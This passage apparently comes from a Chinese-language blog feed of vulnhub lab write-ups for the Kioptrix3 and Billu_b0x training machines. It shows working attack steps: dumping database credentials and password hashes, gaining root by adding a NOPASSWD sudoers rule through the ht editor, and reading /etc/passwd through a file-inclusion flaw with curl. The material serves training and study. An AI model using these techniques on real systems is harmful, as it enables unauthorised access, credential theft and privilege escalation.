gfooter.php     logout.php        readme.html    tags.php<br>db.sql       gfunctions.php  p.php             recent.php     themes<br>g.php        gheader.php     photos            register.php   version.txt<br>gadmin       index.php       photos.php        scopbin        vote.php<br>gallery.php  install.BAK     post_comment.php  search.php<br>gconfig.php  login.php       profile.php       slideshow.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ cat ./gallery/gconfig.php<br>cat ./gallery/gconfig.php<br>&lt;?php<br>        error_reporting(0);<br>        /*<br>                A sample Gallarific configuration file. You should edit<br>                the installer details below and save this file as gconfig.php<br>                Do not modify anything else if you don&#x27;t know what it is.<br>        */<br><br>        // Installer Details -----------------------------------------------<br><br>        // Enter the full HTTP path to your Gallarific folder below,<br>        // such as http://www.yoursite.com/gallery<br>        // Do NOT include a trailing forward slash<br><br>        $GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;<br><br>        $GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;<br>        $GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;<br>        $GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;<br>        $GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;<br><br>        // Setting Details -------------------------------------------------<br><br>if(!$g_mysql_c = @mysql_connect($GLOBALS[&quot;gallarific_mysql_server&quot;], $GLOBALS[&quot;gallarific_mysql_username&quot;], $GLOBALS[&quot;gallarific_mysql_password&quot;])) &#123;<br>                echo(&quot;A connection to the database couldn&#x27;t be established: &quot; . mysql_error());<br>                die();<br>&#125;else &#123;<br>        if(!$g_mysql_d = @mysql_select_db($GLOBALS[&quot;gallarific_mysql_database&quot;], $g_mysql_c)) &#123;<br>                echo(&quot;The Gallarific database couldn&#x27;t be opened: &quot; . mysql_error());<br>                die();<br>        &#125;else &#123;<br>                $settings=mysql_query(&quot;select * from gallarific_settings&quot;);<br>                if(mysql_num_rows($settings)!=0)&#123;<br>                        while($data=mysql_fetch_array($settings))&#123;<br>                                $GLOBALS[&quot;&#123;$data[&#x27;settings_name&#x27;]&#125;&quot;]=$data[&#x27;settings_value&#x27;];<br>                        &#125;<br>                &#125;<br><br>        &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>拿到了数据库的用户名和密码，登录mysql数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u root -p<br>mysql -u root -p<br>Enter password: fuckeyou<br><br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 10<br>Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the buffer.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show database;</span><br>show database;<br>ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;database&#x27; at line 1<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show databases;</span><br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema | <br>| gallery            | <br>| mysql              | <br>+--------------------+<br>3 rows in set (0.00 sec)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">use gallery</span><br>use gallery<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show tables;</span><br>show tables;<br>+----------------------+<br>| Tables_in_gallery    |<br>+----------------------+<br>| dev_accounts         | <br>| gallarific_comments  | <br>| gallarific_galleries | <br>| gallarific_photos    | <br>| gallarific_settings  | <br>| gallarific_stats     | <br>| gallarific_users     | <br>+----------------------+<br>7 rows in set (0.00 sec)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from gallarific_users</span><br>select * from gallarific_users<br>    -&gt; ;<br>;<br>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+<br>| userid | username | password | usertype  | firstname | lastname | email | datejoined | website | issuperuser | photo | joincode |<br>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+<br>|      1 | admin    | n0t7t1k4 | superuser | Super     | User     |       | 1302628616 |         |           1 |       |          | <br>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+<br>1 row in set (0.01 sec)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from dev_accounts</span><br>select * from dev_accounts<br>    -&gt; ;<br>;<br>+----+------------+----------------------------------+<br>| id | username   | password                         |<br>+----+------------+----------------------------------+<br>|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | <br>|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | <br>+----+------------+----------------------------------+<br>2 rows in set (0.01 sec)<br></code></pre></td></tr></table></figure><p>发现了许多东西啊……，admin尝试登录后台失败，下面两个用户登录也失败，尝试一下登录ssh，admin失败，loneferret成功</p><p><img src="/pic/935cd37da07c7bb5d1552029814721dc_MD5.png" alt="image.png"></p><p>登录也成功</p><h3 id="ht软件编辑器提权"><a href="#ht软件编辑器提权" class="headerlink" title="ht软件编辑器提权"></a>ht软件编辑器提权</h3><p>查看当前用户权限，发现ht具有root权限。而且提示我们ht是一个软件编辑器。</p><p><img src="/pic/6b771d75ba14de2d6b773bf8c24bbee9_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install terminal.app  <span class="hljs-comment"># 这里我是安装terminal.app利用的</span><br> <br>terminal  <span class="hljs-comment"># 运行</span><br> <br>出现蓝色界面，按F3，然后输入/etc/sudoers，回车<br></code></pre></td></tr></table></figure><p><img src="/pic/2c5bf1a78c429071308d154963ba5294_MD5.png"></p><p>添加如下图内容，然后按 F2保存，Ctrl+c 退出即可。</p><p><img src="/pic/a2722597f306cadc9d82853b5cec799c_MD5.png"></p><p>重新查看用户权限，发现已经成功添加，sudo执行即可获取root权限。</p><p><img src="/pic/48a30c7cc9392cf98cd5c623dd35b833_MD5.png"></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Penetration</title>
    <link href="/2023/05/6ff068cfb36c.html"/>
    <url>/2023/05/6ff068cfb36c.html</url>
    
    <content type="html"><![CDATA[<h1 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h1><p>[[Kioptrix1.2靶机]]</p><p>[[Billu_b0x靶机]]</p><p>[[WestWild 1.1靶机]]</p><p>[[BNE0x03Simple靶机]]</p><p>[[Nullbyte靶机]]</p><p>[[PC 靶机]]</p><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>#LotusCMS远程代码执行 [[Kioptrix1.2靶机.md|Kioptrix1.2靶机LotusCMS]]</p><p>#SQL注入绕过登录 [[Billu_b0x靶机#SQL 注入]]</p><p>#用户可写目录 [[WestWild 1.1靶机#查看用户可写目录]]</p><p>#CuteCMS远程文件上传漏洞 [[BNE0x03Simple靶机#CuteCMS2.0.3 文件上传漏洞]]</p><p>#gRPC配置不安全 [[PC 靶机#SQL 注入]]</p><p>#pyLoad预授权远程代码执行漏洞 [[PC 靶机#CVE-2023-0297 Pre-auth RCE in pyLoad]]</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>#ht编辑器提权 [[Kioptrix1.2靶机.md#ht软件编辑器提权]] :&#x2F;etc&#x2F;sudoers <code>myuser ALL=(ALL) NOPASSWD: ALL</code></p><p>#密码重用 [[Billu_b0x靶机#密码重用 ssh 登录]]</p><p>#overlayfs内核提权 [[Billu_b0x靶机#内核提权]] [[BNE0x03Simple靶机#提权]]</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>knowledge</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Billu_b0x靶机</title>
    <link href="/2023/05/f998d5ae2c5e.html"/>
    <url>/2023/05/f998d5ae2c5e.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>这台靶机包含的内容比较多，信息收集、本地文件读取、代码审计、SQL 注入等，需要具有比较全面的安全知识，并且要对网站的目录结构和逻辑有较为清晰的认识，才能在打靶机的过程中游刃有余，从而形成自己的渗透思路。</p></blockquote><h1 id="Billu-b0x-靶机"><a href="#Billu-b0x-靶机" class="headerlink" title="Billu_b0x 靶机"></a>Billu_b0x 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -p22,80 10.10.10.161 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-24 04:30 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.161<br>Host is up (0.00024s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)<br>|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)<br>|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-title: --==[[Indipowershell Lab]]==--<br>|_http-server-header: Apache/2.2.22 (Ubuntu)<br>MAC Address: 00:0C:29:A9:A2:24 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.88 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 10.10.10.161<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-24 04:32 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.161<br>Host is up (0.00028s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>| http-enum: <br>|   /test.php: Test page<br>|_  /images/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.22 (ubuntu)&#x27;</span><br>| http-internal-ip-disclosure: <br>|_  Internal IP Leaked: 127.0.1.1<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">MAC Address: 00:0C:29:A9:A2:24 (VMware)</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 32.03 seconds</span><br></code></pre></td></tr></table></figure><p>似乎没有得到特别有效的信息，倒是有个特殊的文件 test.php 那就进入 web 查看环节吧</p><h2 id="Web-服务查看"><a href="#Web-服务查看" class="headerlink" title="Web 服务查看"></a>Web 服务查看</h2><p>首先看看 80 端口，是一个登录界面，感觉可能存在 sql 注入，尝试使用’符号来注入，失败。接下来分别使用了常用的”,},)进行闭合，似乎简单的注入并没有用，可能是存在过滤或者替换吧，目录爆破看看吧 </p><p><img src="/pic/cbef8013431f8f2800f8b83e9c1e628b_MD5.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo gobuster <span class="hljs-built_in">dir</span> <span class="hljs-literal">-u</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/ <span class="hljs-literal">-w</span> /usr/share/wordlists/dirbuster/directory<span class="hljs-literal">-list-2</span>.<span class="hljs-number">3</span><span class="hljs-literal">-medium</span>.txt <span class="hljs-literal">-x</span> php,txt,html <span class="hljs-literal">-t</span> <span class="hljs-number">64</span><br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.<span class="hljs-number">2.0</span><span class="hljs-literal">-dev</span><br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/<br>[+] Method:                  GET<br>[+] Threads:                 <span class="hljs-number">64</span><br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory<span class="hljs-literal">-list-2</span>.<span class="hljs-number">3</span><span class="hljs-literal">-medium</span>.txt<br>[+] Negative Status codes:   <span class="hljs-number">404</span><br>[+] User Agent:              gobuster/<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span><span class="hljs-literal">-dev</span><br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 <span class="hljs-number">10</span>s<br>===============================================================<br><span class="hljs-number">2023</span>/<span class="hljs-number">05</span>/<span class="hljs-number">24</span> <span class="hljs-number">05</span>:<span class="hljs-number">13</span>:<span class="hljs-number">15</span> Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index                (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">3267</span>]<br>/images               (Status: <span class="hljs-number">301</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">313</span>] [--&gt; <span class="hljs-type">http</span>://<span class="hljs-number">10.10</span><span class="hljs-type">.10.161</span>/<span class="hljs-type">images</span>/]<br>/index.php            (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">3267</span>]<br>/c.php                (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/c                    (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/in.php               (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">47526</span>]<br>/<span class="hljs-keyword">in</span>                   (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">47522</span>]<br>/show                 (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/show.php             (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/add.php              (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">307</span>]<br>/add                  (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">307</span>]<br>/test                 (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">72</span>]<br>/test.php             (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">72</span>]<br>/.html                (Status: <span class="hljs-number">403</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">285</span>]<br>/head.php             (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2793</span>]<br>/head                 (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2793</span>]<br>/uploaded_images      (Status: <span class="hljs-number">301</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">322</span>] [--&gt; <span class="hljs-type">http</span>://<span class="hljs-number">10.10</span><span class="hljs-type">.10.161</span>/<span class="hljs-type">uploaded_images</span>/]                                                                                      <br>/panel                (Status: <span class="hljs-number">302</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2469</span>] [--&gt; <span class="hljs-type">index.php</span>]<br>/panel.php            (Status: <span class="hljs-number">302</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2469</span>] [--&gt; <span class="hljs-type">index.php</span>]<br>/head2                (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2468</span>]<br>/head2.php            (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2468</span>]<br>/.html                (Status: <span class="hljs-number">403</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">285</span>]<br>/server<span class="hljs-literal">-status</span>        (Status: <span class="hljs-number">403</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">293</span>]<br>Progress: <span class="hljs-number">879939</span> / <span class="hljs-number">882244</span> (<span class="hljs-number">99.74</span>%)===============================================================<br><span class="hljs-number">2023</span>/<span class="hljs-number">05</span>/<span class="hljs-number">24</span> <span class="hljs-number">05</span>:<span class="hljs-number">16</span>:<span class="hljs-number">07</span> Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>确实有些有意思的目录，images，c，show，add，test，head，uploaded_images，panel，head2.php，挨个查看（实际上这里有个 phpmy 目录未被扫出来）</p><p>images 目录</p><p><img src="/pic/e95e3608674cd1bdda207590df01467b_MD5.png"></p><p>add 目录，尝试 add 上传图片但是失败，并没有在 uploaded_images 中看到上传的文件</p><p><img src="/pic/5b518a1330c189395ffc4a7e8da149de_MD5.png"></p><p>uploaded_images 目录，这里的 1.jpg 是后面的后面才上传成功的，与刚才直接尝试上传无关</p><p><img src="/pic/87d9319a7ff9b6f3c36c6e1f52cc3a04_MD5.png"></p><p>c, show 无回显，panel 返回到登录界面</p><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>test. php</p><p><img src="/pic/a2753f261c0e728fb2c5db739b813bf9_MD5.png"></p><p>提示缺少参数 file，尝试在 url 中添加</p><p><img src="/pic/ed3faeeb3039d77dd1b1a62097275521_MD5.png"></p><p>失败，那就尝试使用 POST 方法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=/etc/passwd&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>root:x:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:root:/root:/bin/bash<br>daemon:x:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:daemon:/usr/sbin:/bin/sh<br>bin:x:<span class="hljs-number">2</span>:<span class="hljs-number">2</span>:bin:/bin:/bin/sh<br>sys:x:<span class="hljs-number">3</span>:<span class="hljs-number">3</span>:sys:/dev:/bin/sh<br>sync:x:<span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:sync:/bin:/bin/sync<br>games:x:<span class="hljs-number">5</span>:<span class="hljs-number">60</span>:games:/usr/games:/bin/sh<br><span class="hljs-built_in">man</span>:x:<span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-built_in">man</span>:/var/cache/<span class="hljs-built_in">man</span>:/bin/sh<br><span class="hljs-built_in">lp</span>:x:<span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-built_in">lp</span>:/var/spool/lpd:/bin/sh<br>mail:x:<span class="hljs-number">8</span>:<span class="hljs-number">8</span>:mail:/var/mail:/bin/sh<br>news:x:<span class="hljs-number">9</span>:<span class="hljs-number">9</span>:news:/var/spool/news:/bin/sh<br>uucp:x:<span class="hljs-number">10</span>:<span class="hljs-number">10</span>:uucp:/var/spool/uucp:/bin/sh<br>proxy:x:<span class="hljs-number">13</span>:<span class="hljs-number">13</span>:proxy:/bin:/bin/sh<br>www<span class="hljs-literal">-data</span>:x:<span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www<span class="hljs-literal">-data</span>:/var/www:/bin/sh<br>backup:x:<span class="hljs-number">34</span>:<span class="hljs-number">34</span>:backup:/var/backups:/bin/sh<br>list:x:<span class="hljs-number">38</span>:<span class="hljs-number">38</span>:Mailing List Manager:/var/list:/bin/sh<br>irc:x:<span class="hljs-number">39</span>:<span class="hljs-number">39</span>:ircd:/var/run/ircd:/bin/sh<br>gnats:x:<span class="hljs-number">41</span>:<span class="hljs-number">41</span>:Gnats Bug<span class="hljs-literal">-Reporting</span> System (admin):/var/lib/gnats:/bin/sh<br>nobody:x:<span class="hljs-number">65534</span>:<span class="hljs-number">65534</span>:nobody:/nonexistent:/bin/sh<br>libuuid:x:<span class="hljs-number">100</span>:<span class="hljs-number">101</span>::/var/lib/libuuid:/bin/sh<br>syslog:x:<span class="hljs-number">101</span>:<span class="hljs-number">103</span>::/home/syslog:/bin/false<br>mysql:x:<span class="hljs-number">102</span>:<span class="hljs-number">105</span>:MySQL Server,,,:/nonexistent:/bin/false<br>messagebus:x:<span class="hljs-number">103</span>:<span class="hljs-number">106</span>::/var/run/dbus:/bin/false<br>whoopsie:x:<span class="hljs-number">104</span>:<span class="hljs-number">107</span>::/nonexistent:/bin/false<br>landscape:x:<span class="hljs-number">105</span>:<span class="hljs-number">110</span>::/var/lib/landscape:/bin/false<br>sshd:x:<span class="hljs-number">106</span>:<span class="hljs-number">65534</span>::/var/run/sshd:/usr/sbin/nologin<br>ica:x:<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:ica,,,:/home/ica:/bin/bash<br></code></pre></td></tr></table></figure><p>得到了一些用户信息，验证了存在远程文件包含漏洞。接下来我们利用目录爆破的结果获取一下几个文件的内容</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~]<br>└─$ curl -X POST --data <span class="hljs-string">&quot;file=./index.php&quot;</span> http:<span class="hljs-comment">//10.10.10.161/test.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;c.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;head.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]!=<span class="hljs-literal">true</span>)<br>&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]=<span class="hljs-string">&#x27;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]==<span class="hljs-literal">true</span> &amp;&amp;  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>)<br>&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are logged in :)&quot;</span>;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: panel.php&#x27;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">302</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=center style=&quot;margin:30px 0px 0px 0px;&quot;&gt;</span><br><span class="hljs-string">&lt;font size=8 face=&quot;comic sans ms&quot;&gt;--==[[ billu b0x ]]==--&lt;/font&gt; </span><br><span class="hljs-string">&lt;br&gt;&lt;br&gt;</span><br><span class="hljs-string">Show me your SQLI skills &lt;br&gt;</span><br><span class="hljs-string">&lt;form method=post&gt;</span><br><span class="hljs-string">Username :- 